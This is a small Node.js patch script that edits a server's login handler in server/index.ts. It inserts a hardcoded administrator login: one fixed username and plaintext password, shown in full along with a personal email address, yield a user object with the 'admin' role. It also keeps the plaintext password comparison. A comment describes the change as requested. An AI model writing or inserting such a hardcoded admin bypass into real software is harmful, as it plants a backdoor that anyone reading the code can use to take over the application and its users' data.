import fs from 'fs';

let content = fs.readFileSync('server/index.ts', 'utf8');

const target = `    // Find matching user with simple check
    const user = users.find(u => u.username === username && u.passwordHash === password);
    
    if (user) {`;

const replacement = `    // Find matching user with simple check
    let user = users.find(u => u.username === username && u.passwordHash === password);
    
    // Hardcoded requested admin check
    if (!user && username === 'Jemal Fano' && password === 'Esb#2026') {
      user = {
        id: 'admin_hardcoded',
        username: 'Jemal Fano',
        email: 'jemalfan030@gmail.com',
        passwordHash: 'Esb#2026',
        role: 'admin'
      };
    }

    if (user) {`;

if (content.includes(target)) {
  content = content.replace(target, replacement);
  fs.writeFileSync('server/index.ts', content);
  console.log("Patched successfully");
} else {
  console.log("Target not found");
}
